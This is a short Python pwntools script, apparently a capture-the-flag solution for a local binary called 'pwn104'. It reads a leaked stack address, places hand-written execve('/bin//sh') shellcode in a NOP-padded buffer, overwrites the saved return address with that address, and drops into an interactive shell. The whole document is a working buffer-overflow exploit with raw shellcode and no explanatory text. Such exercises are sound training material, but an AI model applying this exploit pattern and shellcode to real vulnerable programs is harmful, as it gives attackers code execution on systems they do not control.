from pwn import *

io = process("./pwn104")

io.recvuntil("at")

stack_position = int(io.recvline().decode().strip(), 16)

print(f"Stack position: {hex(stack_position)}")
shellcode = shellcraft.sh()
print(shellcode)
shellcode = b"\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05"

payload = shellcode + b'\x90'*(80 - len(shellcode)) + b"B"*8 + p64(stack_position)

io.send(payload)

io.interactive()


